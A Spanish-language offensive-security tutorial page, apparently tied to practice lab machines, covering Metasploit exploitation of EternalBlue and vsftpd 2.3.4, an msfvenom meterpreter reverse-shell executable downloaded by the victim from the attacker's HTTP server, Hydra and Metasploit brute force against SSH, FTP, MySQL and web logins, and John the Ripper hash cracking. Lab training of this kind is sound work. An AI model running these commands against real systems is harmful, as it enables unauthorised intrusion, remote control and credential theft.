---
icon: '3'
---

# Explotación de Vulnerabilidades y Ataques de Fuerza Bruta

## Enlace Alternativo de Descarga de los Laboratorios

{% embed url="https://drive.google.com/drive/folders/1EOkfWHycCEsO2QU6DHhloN7pnDAu6-vg" %}

## Uso Básico de Metasploit – Explotación EternalBlue en Windows

**EternalBlue** es una vulnerabilidad en SMBv1 de Windows (CVE-2017-0143), aprovechada por malware como WannaCry. A continuación, te muestro cómo explotar esta vulnerabilidad usando Metasploit:

```bash
# 1. Iniciar Metasploit
msfconsole

# 2. Buscar el exploit EternalBlue (CVE-2017-0143)
search eternalblue/CVE-2017-0143

# 3. Seleccionar el exploit encontrado
use 0

# 4. Mostrar las opciones disponibles del módulo
show options

# 5. Configurar la dirección IP de la máquina víctima
set RHOSTS <IP de la máquina víctima>

# 6. Ejecutar el exploit
run
```

Este exploit aprovecha una vulnerabilidad crítica en SMBv1, permitiendo ejecución remota de código en sistemas no parcheados.

## Uso Básico de Metasploit – Explotación vsftpd en Linux

#### Reconocimiento

```bash
arp-scan -I eth0 --localnet
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn <IP máquina atacante> -oN escaneo
nmap --script "vuln" -p21 <IP máquina víctima> 
```

#### Explotación

```bash
search vsFTPd 2.3.4
use 0
show options
set RHOSTS <IP máquina víctima> 
run
```

## Msfvenom – Generar Nuestros Propios Payloads

En este ejemplo, creamos un payload malicioso con `msfvenom`, lo servimos con un servidor HTTP simple, y luego utilizamos el módulo **Multihandler** en Metasploit para manejar la conexión reverse shell.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=443 -f exe -o pwned.exe
```

* `-p windows/x64/meterpreter/reverse_tcp`: Especifica el payload `meterpreter/reverse_tcp` para Windows de 64 bits.
* `LHOST=<IP máquina atacante>`: La dirección IP de la máquina atacante (donde recibiremos la conexión).
* `LPORT=443`: El puerto donde la víctima se conectará.
* `-f exe`: Formato de salida `.exe`.
* `-o pwned.exe`: El nombre del archivo generado.

Para hacer que la víctima descargue el payload, utilizamos un servidor HTTP en la máquina atacante.

```bash
python3 -m http.server 80
```

* Este comando inicia un servidor HTTP en el puerto 80.

En la máquina víctima, abrimos un navegador o usamos una utilidad como `wget` o `curl` para descargar el archivo ejecutable servido en la máquina atacante:

```bash
# Descargar desde la máquina víctima 
wget http://<IP máquina atacante>/pwned.exe
```

Ahora, configuramos **Metasploit** para manejar la conexión del **payload**.

```bash
# Iniciar msfconsole
msfconsole

# 1. Usar el módulo Multihandler
use exploit/multi/handler

# 2. Mostrar opciones
show options

# 3. Configurar el payload utilizado por el Multihandler
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 4. Configurar el puerto LPORT (debe coincidir con el que usamos en msfvenom, 443 en este caso)
set LPORT 443

# 5. Configurar la dirección IP de la máquina atacante
set LHOST <IP máquina atacante>

# 6. Ejecutar el handler
run
```

Este proceso nos permite obtener una sesión `meterpreter` una vez que el archivo malicioso es ejecutado en la máquina de la víctima.

## Uso de Hydra – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly3" %}

```
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://<IP máquina víctima>
```

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ftp://<IP máquina víctima>
```

## Uso de Hydra – Ataques de Fuerza Bruta a Usuarios (SSH y FTP)

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://<IP máquina víctima>
```

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://<IP máquina víctima>
```

## Fuerza Bruta a Paneles de Login Web

{% embed url="https://vulnyx.com/#blog" %}

En BurpSuite, primero en ajustes en la parte de conexión de proxy debemos configurarlo así.

<figure><img src="../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>

Ahora ya podemos interceptar la conexión. Le damos a Intercept is off. Ponemos la contraseña y al darle a enviar revisamos que interceptó las credenciales.

```
hydra -t 64 -l admin -P <diccionario> <ip> http-post-form “/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect”
```

## Ataques de Fuerza Bruta con Metasploit

{% embed url="https://hackmyvm.eu/machines/machine.php?vm=Friendly3" %}

```
search ftp_login
use 0
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <usuario>
set RHOSTS <IP máquina víctima>
run
```

```bash
search ssh_login
use 0
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME <usuario>
set RHOSTS <IP máquina víctima>
run
```

## Ataques de Fuerza Bruta contra Bases de Datos

{% embed url="https://drive.google.com/file/d/1kJsjmttn7McRuj8Tx71ootLMnTnaIWo4/view?usp=sharing" %}

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt mysql://<IP máquina víctima>
```

A veces las contraseñas suelen estar al final del diccionario `rockyou.txt` por lo que realizamos:

```
tac /usr/share/wordlists/rockyou.txt > rockyou_invertido.txt
```

> Nota: Revisar el archivo por si acaso

Mejoramos el diccionario para hacerlo más ordenado.

```bash
cat rockyou_invertido.txt | tr -d ' ' > diccionario_sin_espacios.txt
```

```bash
hydra -l <usuario> -P diccionario_sin_espacios.txt mysql://<IP máquina víctima>
```

Nos conectamos a **MySQL**.

```bash
mysql -h <IP máquina víctima> -u <usuario> -p<contraseña> 
```

```bash
show databases;
use <database>;
show tables;
SELECT * FROM users;
```

## Ataques de Fuerza Bruta en Local con John The Ripper

```bash
zip2john archivo.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Si es un archivo **.kdbx**.

```bash
keepass2john Database.kdbx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

Si es un **hash**.&#x20;

```bash
apt install hash-identifier
john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
```
